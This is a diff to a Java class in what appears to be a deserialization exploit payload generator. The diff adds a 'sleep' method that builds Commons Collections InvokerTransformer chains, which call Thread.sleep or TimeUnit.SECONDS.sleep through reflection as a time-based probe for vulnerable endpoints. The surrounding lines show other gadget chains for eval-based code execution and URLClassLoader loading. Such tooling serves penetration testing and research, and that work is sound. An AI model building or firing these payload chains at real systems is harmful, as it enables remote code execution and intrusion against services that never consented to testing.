@@ -17,6 +17,7 @@ import java.io.FileOutputStream;
 import java.net.Socket;
 import java.net.URL;
 import java.net.URLClassLoader;
+import java.util.concurrent.TimeUnit;
 
 /**
  * @author Whoopsunix
@@ -100,6 +101,44 @@ public class InvokerTransformer3 {
                 new InvokerTransformer("eval", new Class[]{
                         String.class}, new Object[]{code}),
                 new ConstantTransformer(1)};
+    }
+
+    /**
+     * 线程延时
+     *
+     * @param sinksHelper
+     * @return
+     */
+    @EnchantType({EnchantType.Sleep})
+    public Transformer[] sleep(SinksHelper sinksHelper) {
+        String sleep = sinksHelper.getSleep();
+        Long sleepTime = sinksHelper.getSleepTime();
+
+        Transformer[] transformers = null;
+        if (sleep == null) {
+            sleepTime = sleepTime * 1000L;
+            transformers = new Transformer[]{
+                    new ConstantTransformer(Thread.class),
+                    new InvokerTransformer("getMethod", new Class[]{
+                            String.class, Class[].class}, new Object[]{
+                            "currentThread", null}),
+                    new InvokerTransformer("invoke", new Class[]{
+                            Object.class, Object[].class}, new Object[]{
+                            null, null}),
+                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
+                    new ConstantTransformer(1)};
+        } else if (sleep.equalsIgnoreCase("timeunit")) {
+            transformers = new Transformer[]{
+                    new ConstantTransformer(TimeUnit.class),
+                    new InvokerTransformer("getDeclaredField", new Class[]{
+                            String.class}, new Object[]{
+                            "SECONDS"}),
+                    new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
+                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{sleepTime}),
+                    new ConstantTransformer(1)};
+        }
+
+        return transformers;
     }
 
     /**
@@ -199,7 +238,7 @@ public class InvokerTransformer3 {
                     new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{args}}),
                     new ConstantTransformer(1)};
         } else {
-            // 默认 static
+            // 默认 static 无参构造
             transformers = new Transformer[]{
                     new ConstantTransformer(URLClassLoader.class),
                     new InstantiateTransformer(
